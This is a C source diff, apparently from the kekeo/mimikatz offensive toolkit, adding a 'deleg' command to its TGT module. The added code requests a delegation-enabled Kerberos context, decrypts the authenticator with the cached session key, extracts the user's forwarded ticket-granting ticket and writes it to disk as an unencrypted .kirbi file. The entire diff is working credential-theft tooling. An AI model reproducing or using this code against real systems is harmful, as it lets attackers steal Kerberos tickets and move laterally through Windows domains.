@@ -9,6 +9,7 @@ const KUHL_M_C kuhl_m_c_tgt[] = {
 	{kuhl_m_tgt_ask,	L"ask", L"Ask a TGT with various authentication methods"},
 	{kuhl_m_tgt_pac,	L"pac", L"pacman"},
 	{kuhl_m_tgt_asreq,	L"asreq", L"PKINIT Mustiness"},
+	{kuhl_m_tgt_deleg,	L"deleg", L"Ask a delegate TGT by using a fake target"},
 };
 const KUHL_M kuhl_m_tgt = {
 	L"tgt",	L"TGT module", NULL,
@@ -181,6 +182,219 @@ BOOL kuhl_m_tgt_asreq_export(DWORD cookie, PFILETIME fTime, PKIWI_AUTH_INFOS aut
 			else PRINT_ERROR(L"swprintf_s/buffer\n");
 			LocalFree(filename);
 		}
+	}
+	return status;
+}
+
+NTSTATUS kuhl_m_tgt_deleg(int argc, wchar_t * argv[])
+{
+	SECURITY_STATUS status;
+	CredHandle hClientCred;
+	CtxtHandle hClientCtx;
+	SecBuffer SBClientOut = {0, SECBUFFER_TOKEN, NULL};
+	SecBufferDesc SBDClientOut = {SECBUFFER_VERSION, 1, &SBClientOut};
+	ULONG ClientContextAttr;
+	LPCWCHAR szClientTarget;
+
+	int toDecPdu = AP_REQ_PDU;
+	AP_REQ *ApReq = NULL;
+	Authenticator *authenticator = NULL;
+	KRB_CRED *KrbCred = NULL;
+	OssBuf toDecode = {0, NULL}, DecryptedAuthenticator = {0, NULL}, DecryptedKrbCredEnc = {0, NULL}, PlainKrbCredEnc = {0, NULL};
+	EncryptedData previousEncrypted = {0};
+	EncryptionKey sessionKey = {0};
+
+	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
+	NTSTATUS ntStatus;
+	LPWSTR filename, target = NULL;
+	DWORD ret;
+
+	if(kull_m_string_args_byName(argc, argv, L"target", &szClientTarget, NULL))
+		kull_m_string_copy(&target, szClientTarget);
+	else
+	{
+		ret = DsGetDcName(NULL, NULL, NULL, NULL, DS_RETURN_DNS_NAME | DS_IP_REQUIRED, &cInfo);
+		if(ret == ERROR_SUCCESS)
+		{
+			kull_m_string_sprintf(&target, L"HOST/%s", cInfo->DomainControllerName + 2);
+			NetApiBufferFree(cInfo);
+		}
+		else PRINT_ERROR(L"DsGetDcName: %u\n", ret);
+	}
+
+	if(target)
+	{
+		kprintf(L"[delegation target] %s (not used)\n", target);
+		status = AcquireCredentialsHandle(NULL, MICROSOFT_KERBEROS_NAME, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hClientCred, NULL);
+		if(status == SEC_E_OK)
+		{
+			status = InitializeSecurityContext(&hClientCred, NULL, (SEC_WCHAR *) target, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH, 0, SECURITY_NATIVE_DREP, NULL, 0, &hClientCtx, &SBDClientOut, &ClientContextAttr, NULL);		
+			if((status == SEC_I_CONTINUE_NEEDED) || (status == SEC_E_OK))
+			{
+				if(ClientContextAttr & ISC_RET_DELEGATE)
+				{
+					if(toDecode.value = kuhl_m_tgt_deleg_searchDataAferOIDInSecBuffer(&SBClientOut))
+					{
+						if(*(PUSHORT) toDecode.value == TOK_ID_KRB_AP_REQ)
+						{
+							toDecode.value += sizeof(USHORT);
+							toDecode.length = SBClientOut.cbBuffer - (LONG) (toDecode.value - (PBYTE) SBClientOut.pvBuffer);
+							if(!ossDecode(&kull_m_kerberos_asn1_world, &toDecPdu, &toDecode, (LPVOID *) &ApReq))
+							{
+								if(kuhl_m_tgt_deleg_EncryptionKeyFromCache(target, ApReq->authenticator.etype, &sessionKey))
+								{
+									ntStatus = kull_m_kerberos_asn1_crypto_encrypt(KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, &sessionKey, (OssBuf *) &ApReq->authenticator.cipher, &DecryptedAuthenticator, FALSE);
+									if(NT_SUCCESS(ntStatus))
+									{
+										toDecPdu = Authenticator_PDU;
+										if(!ossDecode(&kull_m_kerberos_asn1_world, &toDecPdu, &DecryptedAuthenticator, (LPVOID *) &authenticator))
+										{
+											if(authenticator->bit_mask & cksum_present)
+											{
+												if(authenticator->cksum.cksumtype == GSS_CHECKSUM_TYPE)
+												{
+													if(((PKIWI_AUTHENTICATOR_CKSUM) authenticator->cksum.checksum.value)->Flags & GSS_C_DELEG_FLAG)
+													{
+														toDecPdu = KRB_CRED_PDU;
+														toDecode.length = ((PKIWI_AUTHENTICATOR_CKSUM) authenticator->cksum.checksum.value)->Dlgth;
+														toDecode.value = ((PKIWI_AUTHENTICATOR_CKSUM) authenticator->cksum.checksum.value)->Deleg;
+														if(!ossDecode(&kull_m_kerberos_asn1_world, &toDecPdu, &toDecode, (LPVOID *) &KrbCred))
+														{
+															ntStatus = kull_m_kerberos_asn1_crypto_encrypt(KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART, &sessionKey, (OssBuf *) &KrbCred->enc_part.cipher, &DecryptedKrbCredEnc, FALSE);
+															if(NT_SUCCESS(ntStatus))
+															{
+																previousEncrypted = KrbCred->enc_part;
+																KrbCred->enc_part.etype = KERB_ETYPE_NULL;
+																KrbCred->enc_part.cipher = *(_octet1 *) &DecryptedKrbCredEnc;
+																if(filename = kull_m_kerberos_asn1_KrbCred_filename(KrbCred, L"_delegate", NULL))
+																{
+																	if(!ossEncode(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, KrbCred, &PlainKrbCredEnc))
+																	{
+																		kprintf(L"%s -> ", filename);
+																		if(kull_m_file_writeData(filename, PlainKrbCredEnc.value, PlainKrbCredEnc.length))
+																			kprintf(L"OK\n");
+																		else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
+																		ossFreeBuf(&kull_m_kerberos_asn1_world, PlainKrbCredEnc.value);
+																	}
+																	else PRINT_ERROR(L"Unable to encode KRB_CRED: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
+																	LocalFree(filename);
+																}
+																else PRINT_ERROR(L"Unable to get a filename from KRB_CRED\n");
+																KrbCred->enc_part = previousEncrypted;
+																LocalFree(DecryptedKrbCredEnc.value);
+															}
+															else PRINT_ERROR(L"Unable to decrypt KRB_CRED EncryptedData: %08x\n", ntStatus);
+															ossFreePDU(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, KrbCred);
+														}
+														else PRINT_ERROR(L"Unable to decode KRB_CRED: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
+													}
+													else PRINT_ERROR(L"No GSS_C_DELEG_FLAG in Flags: 0x%08x\n", ((PKIWI_AUTHENTICATOR_CKSUM) authenticator->cksum.checksum.value)->Flags);
+												}
+												else PRINT_ERROR(L"cksumtype: 0x%08x\n", authenticator->cksum.cksumtype);
+											}
+											else PRINT_ERROR(L"No cksum in authenticator?");
+											ossFreePDU(&kull_m_kerberos_asn1_world, Authenticator_PDU, authenticator);
+										}
+										else PRINT_ERROR(L"Unable to decode Ticket: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
+										LocalFree(DecryptedAuthenticator.value);
+									}
+									else PRINT_ERROR(L"Unable to decrypt Authenticator: %08x\n", ntStatus);
+									LocalFree(sessionKey.keyvalue.value);
+								}
+								ossFreePDU(&kull_m_kerberos_asn1_world, AP_REP_PDU, ApReq);
+							}
+							else PRINT_ERROR(L"Unable to decode AP_REP: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
+						}
+						else PRINT_ERROR(L"Unable to find Kerberos OID\n");
+					}
+					else PRINT_ERROR(L"Unable to find Kerberos OID\n");
+				}
+				else PRINT_ERROR(L"Client is not allowed to delegate to target\n");
+				if(SBClientOut.pvBuffer)
+					FreeContextBuffer(SBClientOut.pvBuffer);
+				DeleteSecurityContext(&hClientCtx);
+			}
+			else PRINT_ERROR(L"InitializeSecurityContext: 0x%08x\n", status);
+			FreeCredentialHandle(&hClientCred);
+		}
+		else PRINT_ERROR(L"AcquireCredentialsHandle: 0x%08x\n", status);
+		LocalFree(target);
+	}
+	else PRINT_ERROR(L"Unable to get a target (from /target:... or from DC)\n");
+
+
+	return STATUS_SUCCESS;
+}
+
+const BYTE	KeberosV5Legacy[] = {0x06, 0x09, 0x2a, 0x86, 0x48, 0x82, 0xf7, 0x12, 0x01, 0x02, 0x02} /* 1.2.840.48018.1.2.2 */,
+			KeberosV5[] = {0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02} /* 1.2.840.113554.1.2.2 */;
+const OssEncodedOID kerberosOIDs[] = {
+	{sizeof(KeberosV5Legacy), (unsigned char *) KeberosV5Legacy},
+	{sizeof(KeberosV5), (unsigned char *) KeberosV5},
+};
+
+PBYTE kuhl_m_tgt_deleg_searchDataAferOIDInSecBuffer(IN PSecBuffer data)
+{
+	DWORD i;
+	PBYTE ret = NULL;
+	for(i = 0; (i < ARRAYSIZE(kerberosOIDs)) && !ret; i++)
+		ret = (PBYTE) kuhl_m_tgt_deleg_searchInMemory(&kerberosOIDs[i], data->pvBuffer, data->cbBuffer);
+	if(ret)
+		ret += kerberosOIDs[i - 1].length;
+	return ret;
+}
+
+PVOID kuhl_m_tgt_deleg_searchInMemory(IN const OssEncodedOID *oid, IN LPCVOID Start, IN SIZE_T Size)
+{
+	BOOL status = FALSE;
+	PBYTE Result = NULL, CurrentPtr, limite = (PBYTE) Start + Size;
+	for(CurrentPtr = (PBYTE) Start; !status && (CurrentPtr + oid->length <= limite); CurrentPtr++)
+		status = RtlEqualMemory(oid->value, CurrentPtr, oid->length);
+	if(status)
+		Result = CurrentPtr - 1;
+	return Result;
+}
+
+BOOL kuhl_m_tgt_deleg_EncryptionKeyFromCache(LPCWCHAR Target, Int32 etype, EncryptionKey *key)
+{
+	BOOL status = FALSE;
+	NTSTATUS ntStatus, packageStatus;
+	USHORT dwTarget;
+	DWORD szData;
+	PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
+	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
+
+	dwTarget = (USHORT) ((wcslen(Target) + 1) * sizeof(wchar_t));
+	szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;
+	if(pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST) LocalAlloc(LPTR, szData))
+	{
+		pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
+		pKerbRetrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;
+		pKerbRetrieveRequest->EncryptionType = etype;
+		pKerbRetrieveRequest->TargetName.Length = dwTarget - sizeof(wchar_t);
+		pKerbRetrieveRequest->TargetName.MaximumLength  = dwTarget;
+		pKerbRetrieveRequest->TargetName.Buffer = (PWSTR) ((PBYTE) pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
+		RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, Target, pKerbRetrieveRequest->TargetName.MaximumLength);
+		ntStatus = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
+		if(NT_SUCCESS(ntStatus))
+		{
+			if(NT_SUCCESS(packageStatus))
+			{
+				key->keytype = (Int32) pKerbRetrieveResponse->Ticket.SessionKey.KeyType;
+				key->keyvalue.length = pKerbRetrieveResponse->Ticket.SessionKey.Length;
+				if(key->keyvalue.value = (unsigned char *) LocalAlloc(LPTR, key->keyvalue.length))
+				{
+					RtlCopyMemory(key->keyvalue.value, pKerbRetrieveResponse->Ticket.SessionKey.Value, key->keyvalue.length);
+					status = TRUE;
+				}
+				LsaFreeReturnBuffer(pKerbRetrieveResponse);
+			}
+			else if(packageStatus == STATUS_NO_TRUST_SAM_ACCOUNT)
+				PRINT_ERROR(L"\'%wZ\' Kerberos name not found!\n", &pKerbRetrieveRequest->TargetName);
+			else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
+		}
+		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);
+		LocalFree(pKerbRetrieveRequest);
 	}
 	return status;
 }
